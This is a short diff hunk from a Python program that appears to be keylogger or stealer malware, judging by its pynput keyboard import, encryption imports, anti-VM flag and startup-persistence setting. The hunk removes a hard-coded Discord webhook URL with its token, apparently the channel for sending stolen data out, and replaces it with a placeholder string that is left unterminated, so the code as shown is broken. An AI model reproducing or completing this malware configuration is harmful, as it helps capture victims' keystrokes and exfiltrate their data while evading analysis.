@@ -6,7 +6,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from pynput import keyboard
 
-UrLxD = 'https://discord.com/api/webhooks/1150093917832888360/Eplh0sC5bo3EimYM7dBLDJvHFw2y0W77VcYlhM4blvgSBE5hvEA1ccsCX1SwC1_Rm7dV'
+UrLxD = 'REPLACE_ME_FOR_QUİCADXD 
 Anti_Vm = "false"
 wantS = "%StartuP%"
 methodxd = "%MethoD%"
